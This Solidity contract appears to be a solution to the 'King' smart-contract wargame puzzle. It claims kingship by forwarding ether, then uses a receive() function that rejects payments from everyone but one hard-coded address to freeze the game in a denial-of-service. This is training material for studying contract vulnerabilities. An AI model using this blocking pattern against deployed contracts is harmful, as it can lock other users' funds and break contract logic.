// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract Knight {
    address payable king;

    constructor(address payable _king) public payable {
        king = _king;
    }

    function becomeKing() public payable {
        // king.transfer(msg.value);
        (bool success, ) = king.call.value(msg.value)("");
        require(success, "Ether send failed!");
    }

    receive() external payable {
        require(msg.sender == 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    }
}
